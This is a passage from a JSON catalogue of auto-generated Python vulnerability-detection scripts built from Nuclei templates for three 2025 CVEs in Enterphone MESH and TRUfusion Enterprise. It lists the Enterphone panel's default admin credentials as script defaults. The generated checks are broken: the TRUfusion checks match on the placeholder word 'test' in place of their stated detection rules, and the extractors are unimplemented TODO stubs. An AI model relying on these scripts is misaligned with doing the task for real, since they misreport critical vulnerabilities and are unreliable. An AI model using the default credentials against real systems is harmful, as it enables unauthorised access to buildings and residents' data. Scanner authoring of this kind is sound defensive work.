          "course-booking-system"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_26793",
        "name": "FREEDOM Administration - Default Login",
        "language": "Python",
        "famille": "CVE",
        "description": "The Web GUI configuration panel of Hirsch (formerly Identiv and Viscount) Enterphone MESH through 2024 ships with default credentials (username freedom, password viscount). The administrator is not prompted to change these credentials on initial configuration, and changing the credentials requires many steps. Attackers can use the credentials over the Internet via mesh.webadmin.MESHAdminServlet to gain access to dozens of Canadian and U.S. apartment buildings and obtain building residents' PII. NOTE- the Supplier's perspective is that the \"vulnerable systems are not following manufacturers' recommendations to change the default password.\"",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Administration: Controlled Areas, Log Out' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "freedom"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "viscount"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-26793\nName: FREEDOM Administration - Default Login\nSeverity: critical\nDescription: The Web GUI configuration panel of Hirsch (formerly Identiv and Viscount) Enterphone MESH through 2024 ships with default credentials (username freedom, password viscount). The administrator is not prompted to change these credentials on initial configuration, and changing the credentials requires many steps. Attackers can use the credentials over the Internet via mesh.webadmin.MESHAdminServlet to gain access to dozens of Canadian and U.S. apartment buildings and obtain building residents' PII. NOTE- the Supplier's perspective is that the \"vulnerable systems are not following manufacturers' recommendations to change the default password.\"\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_26793:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-26793\"\n    SEVERITY = \"critical\"\n    NAME = \"FREEDOM Administration - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Administration: Controlled Areas, Log Out' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Administration: Controlled Areas, Log Out']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FREEDOM Administration - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_26793(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-26793\nName: FREEDOM Administration - Default Login\nSeverity: critical\nDescription: The Web GUI configuration panel of Hirsch (formerly Identiv and Viscount) Enterphone MESH through 2024 ships with default credentials (username freedom, password viscount). The administrator is not prompted to change these credentials on initial configuration, and changing the credentials requires many steps. Attackers can use the credentials over the Internet via mesh.webadmin.MESHAdminServlet to gain access to dozens of Canadian and U.S. apartment buildings and obtain building residents' PII. NOTE- the Supplier's perspective is that the \"vulnerable systems are not following manufacturers' recommendations to change the default password.\"\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_26793:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-26793\"\n    SEVERITY = \"critical\"\n    NAME = \"FREEDOM Administration - Default Login\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Administration: Controlled Areas, Log Out' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Administration: Controlled Areas, Log Out']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FREEDOM Administration - Default Login\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_26793(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "freedom",
          "admin",
          "mesh",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_27222",
        "name": "TRUfusion Enterprise <= 7.10.4.0 - Path Traversal",
        "language": "Python",
        "famille": "CVE",
        "description": "Pre-Auth Path Traversal Allowing to Leak Local server files disclosing sensitive clear-text passwords.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body, \"MTI3LjAuMC4x\"); contains(content_type, \"application/json\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-27222\nName: TRUfusion Enterprise <= 7.10.4.0 - Path Traversal\nSeverity: critical\nDescription: Pre-Auth Path Traversal Allowing to Leak Local server files disclosing sensitive clear-text passwords.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_27222:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-27222\"\n    SEVERITY = \"critical\"\n    NAME = \"TRUfusion Enterprise <= 7.10.4.0 - Path Traversal\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"MTI3LjAuMC4x\"); contains(content_type, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TRUfusion Enterprise <= 7.10.4.0 - Path Traversal\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_27222(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-27222\nName: TRUfusion Enterprise <= 7.10.4.0 - Path Traversal\nSeverity: critical\nDescription: Pre-Auth Path Traversal Allowing to Leak Local server files disclosing sensitive clear-text passwords.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_27222:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-27222\"\n    SEVERITY = \"critical\"\n    NAME = \"TRUfusion Enterprise <= 7.10.4.0 - Path Traversal\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"MTI3LjAuMC4x\"); contains(content_type, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TRUfusion Enterprise <= 7.10.4.0 - Path Traversal\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_27222(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "trufusion",
          "lfi",
          "vuln",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_27223",
        "name": "TRUfusion Enterprise <= 7.10.4.0 - Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "Hard-Coded Cryptographic key allowing to forge session cookies that can be used to entirely bypass authentication",
        "severity": "critical",
        "detection": "[OR] DSL: contains_all(body,\"\\\"profileName\\\":\",\"\\\"name\\\":\"); contains(content_type, \"application/json\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-27223\nName: TRUfusion Enterprise <= 7.10.4.0 - Authentication Bypass\nSeverity: critical\nDescription: Hard-Coded Cryptographic key allowing to forge session cookies that can be used to entirely bypass authentication\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_27223:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-27223\"\n    SEVERITY = \"critical\"\n    NAME = \"TRUfusion Enterprise <= 7.10.4.0 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body,\"\\\\\"profileName\\\\\":\",\"\\\\\"name\\\\\":\"); contains(content_type, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TRUfusion Enterprise <= 7.10.4.0 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = 